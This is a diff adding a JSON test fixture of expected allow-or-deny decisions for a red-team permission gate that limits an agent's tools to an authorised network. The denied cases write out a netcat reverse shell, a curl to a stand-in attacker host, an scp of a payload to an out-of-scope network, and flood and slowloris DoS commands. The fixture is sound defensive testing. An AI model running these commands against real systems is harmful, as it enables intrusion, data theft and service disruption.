@@ -1,0 +1,101 @@
+{
+  "_comment": "Ground-truth test cases for Red Team Permission Gate. Policy: nmap ungated, metasploit gated_until 'recon', egress allows 10.20.x.x, denies out-of-scope. Recon phase is active but not passing.",
+  "cases": [
+    {
+      "description": "nmap in-scope: scanning authorized network 10.20.0.0/24",
+      "tool": "nmap",
+      "input": {"command": "nmap -sV 10.20.0.0/24"},
+      "expected_decision": "ALLOWED",
+      "expected_gate": null,
+      "expected_reason": ""
+    },
+    {
+      "description": "nmap out-of-scope: scanning unauthorized network 172.16.0.0/12",
+      "tool": "bash",
+      "input": {"command": "nmap -Pn 172.16.0.1"},
+      "expected_decision": "DENIED",
+      "expected_gate": "deny-list",
+      "expected_reason": "-Pn 172.16."
+    },
+    {
+      "description": "metasploit before recon: exploitation attempted before recon passes",
+      "tool": "metasploit",
+      "input": {"command": "use exploit/multi/handler"},
+      "expected_decision": "DENIED",
+      "expected_gate": "phase-gate",
+      "expected_reason": "recon"
+    },
+    {
+      "description": "metasploit after recon: would be allowed once recon=passing (test policy has recon=active)",
+      "tool": "metasploit",
+      "input": {"command": "use exploit/multi/handler"},
+      "expected_decision": "DENIED",
+      "expected_gate": "phase-gate",
+      "expected_reason": "recon"
+    },
+    {
+      "description": "DoS pattern denied: slowloris attack blocked by deny-list",
+      "tool": "bash",
+      "input": {"command": "slowloris 10.20.0.1"},
+      "expected_decision": "DENIED",
+      "expected_gate": "deny-list",
+      "expected_reason": "slowloris"
+    },
+    {
+      "description": "Egress allowed: curl to authorized target",
+      "tool": "bash",
+      "input": {"command": "curl 10.20.0.1:8080/api"},
+      "expected_decision": "ALLOWED",
+      "expected_gate": null,
+      "expected_reason": ""
+    },
+    {
+      "description": "Egress denied: curl to unauthorized host",
+      "tool": "bash",
+      "input": {"command": "curl evil.attacker.com/data"},
+      "expected_decision": "DENIED",
+      "expected_gate": "egress",
+      "expected_reason": "default-deny egress"
+    },
+    {
+      "description": "Deny-list hit: reverse shell attempt",
+      "tool": "bash",
+      "input": {"command": "nc -e /bin/sh 10.0.0.1 4444"},
+      "expected_decision": "DENIED",
+      "expected_gate": "deny-list",
+      "expected_reason": "nc -e"
+    },
+    {
+      "description": "Allowed: write findings file",
+      "tool": "write_file",
+      "input": {"path": "recon-results.txt", "content": "Host: 10.20.0.5, Ports: 22,80,443"},
+      "expected_decision": "ALLOWED",
+      "expected_gate": null,
+      "expected_reason": ""
+    },
+    {
+      "description": "Deny-list hit: flood attack pattern",
+      "tool": "bash",
+      "input": {"command": "hping3 --flood 10.20.0.1"},
+      "expected_decision": "DENIED",
+      "expected_gate": "deny-list",
+      "expected_reason": "hping3"
+    },
+    {
+      "description": "Lateral movement denied: scp to out-of-scope network",
+      "tool": "bash",
+      "input": {"command": "scp payload.sh user@172.16.5.1:/tmp/"},
+      "expected_decision": "DENIED",
+      "expected_gate": "deny-list",
+      "expected_reason": "scp "
+    },
+    {
+      "description": "Allowed: bash echo on in-scope work",
+      "tool": "bash",
+      "input": {"command": "echo 'scanning 10.20.0.5'"},
+      "expected_decision": "ALLOWED",
+      "expected_gate": null,
+      "expected_reason": ""
+    }
+  ]
+}
